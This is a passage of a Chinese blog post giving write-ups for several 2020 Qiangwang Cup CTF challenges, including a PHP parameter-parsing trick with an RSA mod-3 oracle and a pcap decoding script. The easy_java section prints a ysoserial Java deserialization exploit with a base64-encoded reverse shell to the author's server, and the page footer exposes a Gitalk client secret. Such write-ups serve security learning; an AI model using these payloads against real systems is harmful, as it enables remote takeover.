+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">header(<span class="string">"Content-type:text/html;charset=utf-8"</span>);</span><br><span class="line"></span><br><span class="line">        $data = json_decode($json_string, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        $rand_number = <span class="keyword">isset</span>($_POST[<span class="string">'this_is.able'</span>]) ? $_POST[<span class="string">'this_is.able'</span>] : mt_rand();</span><br><span class="line">        $n = gmp_init($data[<span class="string">'n'</span>]);</span><br><span class="line">        $d = gmp_init($data[<span class="string">'d'</span>]);</span><br><span class="line">        $c = gmp_init($rand_number);</span><br><span class="line">        $m = gmp_powm($c,$d,$n);</span><br><span class="line">        $v3 = gmp_init(<span class="string">'3'</span>);</span><br><span class="line">        $r = gmp_mod($m,$v3);</span><br><span class="line">        $result=(int)gmp_strval($r);</span><br><span class="line">        $dice = <span class="keyword">array</span>(<span class="string">"num"</span>=&gt;$result);</span><br><span class="line">        $json_obj = json_encode($dice);</span><br><span class="line">        <span class="keyword">echo</span> $json_obj;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里涉及到一个trick，因为php变量的原因，如果POST或GET传的参数包含<code>&#39;.&#39; &#39;[&#39; &#39;+&#39; &#39; &#39;</code>会转换成<code>_</code>，</p>
+<p><a href="https://www.anquanke.com/post/id/181682" target="_blank" rel="noopener">如何滥用PHP字符串解析函数绕过IDS、IPS及WAF</a></p>
+<p>用<code>this[is.able</code>向服务器传值，服务器就可以将值赋给<code>$_POST[&#39;this_is.able&#39;]</code>，然后接下来就是密码学了，可以在cookie中发现给了N 、d和加密的flag，我们可以向服务器发送任意密文，服务器返回对应密文解密的结果模3的值，之前的RSA LSB ORACLE攻击是利用模2来二分最终得到m的值，本题用的是模3,</p>
+<h1 id="0x03-easy-java"><a href="#0x03-easy-java" class="headerlink" title="0x03 easy_java"></a>0x03 easy_java</h1><p>题目给了源码，</p>
+<p><a href="https://mount4in.github.io/2020/03/10/高校战" 疫"网络安全分享赛部分赛题复现 #0x02-baby-java">高校战“疫”网络安全分享赛部分赛题复现</a></p>
+<blockquote>
+<p><img src="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/image-20200823215753040.png" alt="image-20200823215753040"></p>
+</blockquote>
+<p>放到idea可以运行，本地采用jdk8u102版本可以成功，但使用jdk8u261不能成功。</p>
+<p>由于题目利用黑名单过滤了很多，所以尝试利用JRMPClient绕过过滤，参考高校战役的baby_java的JRMPListener解法，利用JRMPListener。</p>
+<p>过程如下：</p>
+<p>在客户端执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar JRMPClient 129.204.207.xxx:8888 &gt; jrmpclient.cer</span><br><span class="line">windows系统这条命令只能在cmd下运行，在powershell运行会乱码，原因未知</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/image-20200903152937979.png" alt="image-20200903152937979"></p>
+<p>在vps上执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-master-30099844c6-1.jar  ysoserial.exploit.JRMPListener  8888 CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjkxxxxxxxxMTQvOTxxxxYxCg&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>同时在vps上监听50000端口（与上面的payload相对应）</p>
+<p>然后访问<code>/jdk_der</code>路由</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">payload = open(<span class="string">"aa"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line">proxies = &#123;<span class="string">"http"</span>:<span class="string">"127.0.0.1:8080"</span>&#125;</span><br><span class="line">requests.post(<span class="string">"http://39.101.166.142:8080/jdk_der"</span>,data=payload)</span><br></pre></td></tr></table></figure>
+
+<p>也可以用burp发包</p>
+<p>这时就可以反弹shell了。</p>
+<p><img src="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/image-20200824095918455.png" alt="image-20200824095918455"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;056eaalfe7scd222qwe2df36845b8ed170c67e23e3&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="0x04-红方辅助"><a href="#0x04-红方辅助" class="headerlink" title="0x04 红方辅助"></a>0x04 红方辅助</h1><p>用wireshark打开</p>
+<img src="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/image-20200830171012619.png" alt="image-20200830171012619" style="zoom:150%;">
+
+<p>复制到a.txt。</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">f = open(<span class="string">"a.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line"></span><br><span class="line">f = f.readlines()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">2075</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="comment">#print(f[i])</span></span><br><span class="line">    funcs = &#123;</span><br><span class="line">        <span class="string">"0"</span> : <span class="keyword">lambda</span> x, y : x + y,</span><br><span class="line">        <span class="string">"1"</span> : <span class="keyword">lambda</span> x, y : x - y,</span><br><span class="line">        <span class="string">"2"</span> : <span class="keyword">lambda</span> x, y : x ^ y</span><br><span class="line">    &#125;</span><br><span class="line">    offset = &#123;</span><br><span class="line">        <span class="string">"0"</span> : <span class="number">0xefffff</span>,</span><br><span class="line">        <span class="string">"1"</span> : <span class="number">0xefffff</span>,</span><br><span class="line">        <span class="string">"2"</span> : <span class="number">0xffffff</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#print(i)</span></span><br><span class="line">    btime = str(f[i+<span class="number">1</span>])</span><br><span class="line">    fn = chr(int(f[i+<span class="number">3</span>][<span class="number">16</span>:<span class="number">18</span>],<span class="number">16</span>))</span><br><span class="line">    salt = int(f[i+<span class="number">3</span>][<span class="number">18</span>:<span class="number">20</span>],<span class="number">16</span>)</span><br><span class="line">    ci = f[i+<span class="number">3</span>][<span class="number">20</span>:]</span><br><span class="line">    <span class="comment">#print(ci) </span></span><br><span class="line">    t = struct.unpack(<span class="string">"&lt;i"</span>, bytes().fromhex(btime))[<span class="number">0</span>]</span><br><span class="line">    boffset = offset[fn]</span><br><span class="line">    t -= boffset</span><br><span class="line">    t = struct.pack(<span class="string">"&lt;i"</span>, t)</span><br><span class="line">    k =<span class="number">0</span></span><br><span class="line">    m = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">244</span>,<span class="number">2</span>):</span><br><span class="line">        c = ci[j:j+<span class="number">2</span>]</span><br><span class="line">        j = j+<span class="number">2</span></span><br><span class="line">        <span class="comment">#print(c)</span></span><br><span class="line">        <span class="keyword">if</span> funcs[fn](int(c,<span class="number">16</span>) , salt) % <span class="number">256</span>  ^ t[k] == <span class="number">10</span>:</span><br><span class="line">        	<span class="keyword">break</span></span><br><span class="line">        <span class="comment">#print((funcs[fn](int(c,16) , salt)^ t[k]))</span></span><br><span class="line">        m += chr(funcs[fn](int(c,<span class="number">16</span>) , salt) % <span class="number">256</span>  ^ t[k])</span><br><span class="line"></span><br><span class="line">        k = (k+<span class="number">1</span>)%<span class="number">4</span></span><br><span class="line">    print(m)</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+  </div>
+  <!-- 要添加的内容 -->
+  
+    <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>作者:  </strong>Mount4in</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>文章链接:  </strong>
+          <a href="/2020/08/24/2020强网杯部分题目writeup/" target="_blank" title="2020强网杯部分题目writeup">http://mount4in.github.io/2020/08/24/2020强网杯部分题目writeup/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明:   </strong>
+            本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            许可协议。转载请注明出处!
+          </li>
+        </ul>
+      <div>
+
+  
+  <!---->
+    <footer class="article-footer">
+      <a data-url="http://mount4in.github.io/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/" data-id="clg20p5ui001a14uvafqg12nd"
+         class="article-share-link">Share</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+    </footer>
+
+
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            用idea和maven编写spring项目
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/08/21/2020ciscn-web%E9%A2%98%E7%9B%AEwriteup/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">2020ciscn-web题目writeup</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: 'b7d32ae2538e1a71f462',
+      clientSecret: 'da0452b610458a4ccbc38598fb0d02f0eb9e653d',
+      repo: 'gitalk',
+      owner: 'Mount4in',
+      admin: ['Mount4in'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2023 Mount4in</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="Mount4in"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
